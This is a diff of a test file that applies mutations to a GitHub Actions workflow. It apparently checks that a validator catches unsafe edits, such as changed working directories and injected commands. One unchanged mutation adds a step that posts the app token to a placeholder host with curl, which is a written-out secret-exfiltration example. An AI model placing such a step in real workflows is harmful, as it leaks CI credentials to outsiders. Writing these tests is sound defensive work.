@@ -76,6 +76,18 @@ mutations = {
     "      - name: Derive watcher activation time",
     "      - name: Extra token consumer\n        env:\n          TOKEN: ${{ steps.app-token.outputs.token }}\n        run: curl -d \\\"$TOKEN\\\" https://example.invalid\n\n      - name: Derive watcher activation time"
   ), source],
+  "reconciliation step working directory" => [workflow.sub(
+    "        run: go run ./cmd/actions-watcher",
+    "        working-directory: tools\n        run: go run ./cmd/actions-watcher"
+  ), source],
+  "workflow run working directory default" => [workflow.sub(
+    "name: Actions Watcher\n",
+    "name: Actions Watcher\ndefaults:\n  run:\n    working-directory: tools\n"
+  ), source],
+  "job run working directory default" => [workflow.sub(
+    "  reconcile:\n",
+    "  reconcile:\n    defaults:\n      run:\n        working-directory: tools\n"
+  ), source],
   "extra command in an approved step" => [workflow.sub("set -euo pipefail", "set -euo pipefail\n          echo token"), source],
   "duplicate token step" => [workflow.sub(
     "      - name: Derive watcher activation time",
